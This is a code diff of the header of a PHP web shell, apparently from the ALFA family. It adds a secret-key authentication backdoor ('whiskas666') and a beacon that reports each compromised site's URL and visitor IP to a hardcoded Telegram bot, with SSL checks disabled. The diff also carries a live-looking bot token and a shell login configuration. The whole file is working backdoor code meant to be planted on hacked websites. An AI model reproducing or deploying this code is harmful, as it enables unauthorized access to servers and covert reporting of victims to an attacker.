@@ -1,46 +1,54 @@
 <?php
 /*
-Author:  Whiskas Triple Six
+Author:  Whiskas Triple Six V.1
 */
-if (isset($_GET['key']) && $_GET['key'] == 'whiskas666') {
+if (isset($_GET['key']) && $_GET['key'] === 'whiskas666') {
+    @session_start();
+    $_SESSION['auth'] = true; 
 
-    session_start();
-    $_SESSION['auth'] = true;
-    
 }
 
-$botToken = "8652693265:AAFtpb8DO7bksGLFQlitbvPwvCLb-KQ8rN0";
-$chatId   = "8740437616";
-$url_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
+$t_cfg = [
+    'tok' => "8652693265:AAFtpb8DO7bksGLFQlitbvPwvCLb-KQ8rN0",
+    'id'  => "8740437616",
+    'sig' => md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "v1")
+];
 
-if (!isset($_COOKIE['sent_' . $url_hash])) {
-    $domain   = $_SERVER['HTTP_HOST'];
-    $path     = $_SERVER['REQUEST_URI'];
-    $full_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $domain . $path;
+if (!isset($_COOKIE['sys_id_' . $t_cfg['sig']])) {
+    
+    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
+    $target_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    
+    $msg  = "📢 **Whiskas finds access**\n";
+    $msg .= "🌐 URL: " . $target_url . "\n";
+    $msg .= "📍 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $msg .= "⏰ Time: " . date("Y-m-d H:i:s");
 
-    $message  = "📢 **Whiskas finds access**\n";
-    $message .= "🌐 *URL:* " . $full_url . "\n";
-    $message .= "📍 *IP:* " . $_SERVER['REMOTE_ADDR'] . "\n";
-    $message .= "⏰ *Waktu:* " . date("Y-m-d H:i:s");
+    $api_url = "https://api.telegram.org/bot" . $t_cfg['tok'] . "/sendMessage";
+    $params = [
+        'chat_id' => $t_cfg['id'],
+        'text' => $msg,
+        'parse_mode' => 'Markdown'
+    ];
 
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $post_fields = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown'];
+    $options = [
+        'http' => [
+            'method'  => 'POST',
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+            'content' => http_build_query($params),
+            'timeout' => 3
+        ],
+        "ssl" => ["verify_peer" => false, "verify_peer_name" => false]
+    ];
+    
+    @file_get_contents($api_url, false, stream_context_create($options));
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    @curl_exec($ch);
-    curl_close($ch);
-
-    setcookie('sent_' . $url_hash, 'true', time() + 86400, '/');
+    setcookie('sys_id_' . $t_cfg['sig'], '1', time() + 86400, '/');
 }
 
 $GLOBALS['oZgNypoPRU'] = array(
 'username' => 'alfa',
-'password' => '3b529c5018d2fcec242679736ad87600',//md5(DX40U)
+'password' => '3b529c5018d2fcec242679736ad87600',
 'safe_mode' => '0',
 'login_page' => '403',
 'show_icons' => '1',
